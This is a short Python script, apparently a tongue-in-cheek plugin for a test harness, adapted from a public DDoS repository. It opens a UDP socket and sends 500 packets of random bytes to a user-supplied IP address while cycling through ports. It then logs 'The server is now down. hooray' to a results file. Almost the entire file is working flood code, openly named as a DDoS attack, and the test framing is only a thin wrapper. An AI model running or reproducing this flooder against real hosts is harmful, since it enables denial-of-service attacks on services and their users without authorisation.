# This script was adapted from https://github.com/Ha3MrX/DDos-Attack/blob/master/ddos-attack.py
# Full credit to Ha3MrX, I guess

import socket
import random
import argparse
from time import sleep

RESULTS_OUT = '/tmp/result_lines.txt'

# Options to control the flow of things
parser = argparse.ArgumentParser()
parser.add_argument("--port", "-p", help="Starting port to DDoS attack")
parser.add_argument("--address", "-a", help="IP address to DDoS attack")
parser.add_argument("--skip", "-s", help="Skip the test for no apparent reasons", action="store_true")
parser.add_argument("--nothing", "-n", help="Do nothing", action="store_true")
args = parser.parse_args()

if args.nothing:
    with open(RESULTS_OUT, 'a') as f:
        print("This test did nothing")
        f.write("RESULT pass needless.nothing Nothing happened\n")
    exit()

if args.skip:
    with open(RESULTS_OUT, 'w') as f:
        f.write("RESULT info needless.script.kiddie Someone skipped the test!\n")
    exit()

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

ip = args.address
port = int(args.port)

sent = 0

timer = 500

while timer > 0:
    try:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %%%% %s throught port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

        sleep(0.01)
        timer -= 1

    except Exception as e:
        print("Could not DDoS, test failed!")
        print("Why: ", e)
        with open(RESULTS_OUT, 'w') as f:
            print("failed! writing report...")
            f.write("RESULT fail needless.script.kiddie Could not DDoS because reasons\n")
        exit()

with open(RESULTS_OUT, 'w') as f:
    print("PASSED writing report...")
    f.write("RESULT pass needless.script.kiddie The server is now down. hooray\n")
